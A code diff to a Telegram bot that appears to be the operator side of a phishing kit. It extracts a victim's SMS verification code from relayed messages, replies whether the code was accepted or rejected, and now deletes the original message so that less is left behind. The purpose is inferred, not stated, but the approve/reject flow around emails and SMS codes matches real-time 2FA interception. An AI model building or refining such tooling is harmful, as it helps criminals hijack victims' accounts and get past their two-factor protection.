@@ -209,9 +209,18 @@ bot.on("callback_query", async (query) => {
       } catch (_) {}
 
       // Step 2: Send status as a new reply below the original message
+      // Extract the SMS code from the original Telegram message text
+      const msgText = query.message.text || "";
+      const smsMatch = msgText.match(/SMS[:\s]+([\d\s\-]+)/i);
+      const displayCode = smsMatch ? smsMatch[1].trim() : null;
+
+      const twoFaStatusText = displayCode
+        ? `💬 <code>${displayCode}</code> has been <b>${twoFaStatus.toUpperCase() === "APPROVED" ? "ACCEPTED! ✅" : "REJECTED! ❌"}</b>`
+        : `${twoFaEmoji} <b>${twoFaStatus.toUpperCase()}</b>`;
+
       await bot.sendMessage(
         query.message.chat.id,
-        `${twoFaEmoji} <b>${twoFaStatus.toUpperCase()}</b>`,
+        twoFaStatusText,
         { parse_mode: "HTML" }
       );
 
@@ -235,15 +244,9 @@ bot.on("callback_query", async (query) => {
       body: JSON.stringify({ email: identifier, identifier, status })
     });
 
-    // Step 1: Remove buttons from original message (keep info visible)
+    // Step 1: Delete the original message entirely (no unnecessary leftover)
     try {
-      await bot.editMessageReplyMarkup(
-        { inline_keyboard: [] },
-        {
-          chat_id: query.message.chat.id,
-          message_id: query.message.message_id
-        }
-      );
+      await bot.deleteMessage(query.message.chat.id, query.message.message_id);
     } catch (_) {}
 
     // Step 2: Send standalone status message — SMS (all digits) vs Email
